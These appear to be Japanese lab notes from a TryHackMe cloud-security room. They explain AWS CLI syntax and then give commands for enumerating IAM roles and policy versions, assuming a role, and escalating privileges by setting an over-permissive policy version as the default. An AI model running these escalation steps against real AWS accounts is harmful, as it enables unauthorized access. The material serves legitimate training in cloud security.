...
- <service>- コマンドの対象となるサービス（例：ec2、s3、sts）
- <operation>- 指定されたサービスに適用する操作（例：ボリュームのアタッチ、アドレスの割り当て）
- [--parameters]各操作には、設定可能な特定のパラメータがあります（例：ドメイン、アドレス、タグ、リージョン）。
- [--region]- デフォルトのプロファイル領域を上書きし、指定された領域でコマンドを実行します。
- [--output]- 出力結果のフォーマット（例：テキスト、JSON、表）
...
```sh
# ロール、ポリシー
aws iam get-role --role-name lambda-secrets-reader-role

aws iam get-policy --policy-arn arn:aws:iam::000000000000:policy/lambda-secrets-reader-permissions --query 'Policy.DefaultVersionId'

aws iam get-policy-version --policy-arn arn:aws:iam::000000000000:policy/lambda-secrets-reader-permissions --version-id v1
```
...
CREDS=$(aws sts assume-role \
  --role-arn arn:aws:iam::000000000000:role/finance-reporting-role \
  --role-session-name reviewer-session)
...
### [バージョンロールバック](https://tryhackme.com/room/bypassingcloudsecurity?taskNo=5)

攻撃者が `iam:SetDefaultPolicyVersion` 権限を持っているとする。

```sh
# バージョンを列挙
aws iam list-policy-versions --policy-arn arn:aws:iam::000000000000:policy/analytics-access-policy

# v1, v2 を表示。現在のデフォルトがv1で、v2のみ過剰な権限がついている想定
aws iam get-policy-version --policy-arn arn:aws:iam::000000000000:policy/analytics-access-policy --version-id v1

aws iam get-policy-version --policy-arn arn:aws:iam::000000000000:policy/analytics-access-policy --version-id v2

# v2 をデフォルトバージョンに変更
 aws iam set-default-policy-version \
  --policy-arn arn:aws:iam::000000000000:policy/analytics-access-policy \
  --version-id v2
```
